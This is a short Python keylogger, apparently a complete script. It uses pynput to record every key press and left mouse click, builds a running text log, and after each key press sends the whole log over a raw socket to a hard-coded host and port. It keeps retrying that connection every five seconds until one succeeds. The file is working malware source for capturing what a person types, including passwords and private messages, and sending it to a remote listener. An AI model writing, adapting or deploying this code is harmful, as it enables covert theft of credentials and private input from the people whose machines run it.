import time
from pynput.keyboard import Listener as Klistener
from pynput import keyboard
from pynput.mouse import Listener as Mlistener
from pynput import mouse
import socket

server_ip="192.168.0.24"
server_port = 8888
s = socket.socket()
e = True
text = ""

while e:
    try:
        s.connect((server_ip, server_port))
        e = False
    except socket.error:
        time.sleep(5)
        e = True

def sendLog():
    msg = text.encode()
    s.send(msg)
    s.send("\n".encode())

def keyInputHandeling(key):
    global text

    if key == keyboard.Key.enter or key == mouse.Button.left:
        text+="\n"
    elif key == keyboard.Key.tab:
        text+="\t"
    elif key == keyboard.Key.space:
        text+=" "
    elif key == keyboard.Key.ctrl_l:
        pass
    elif key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.esc:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    else:
        text+=str(key).strip("'")
    print(text)
    sendLog()

def mouseInputHandeling(x, y, click, pressed):
    global text
    if click == mouse.Button.left and pressed:
        text+="\n"

with Klistener(on_press=keyInputHandeling) as k, Mlistener(on_click=mouseInputHandeling) as m:
    k.join()
    m.join()
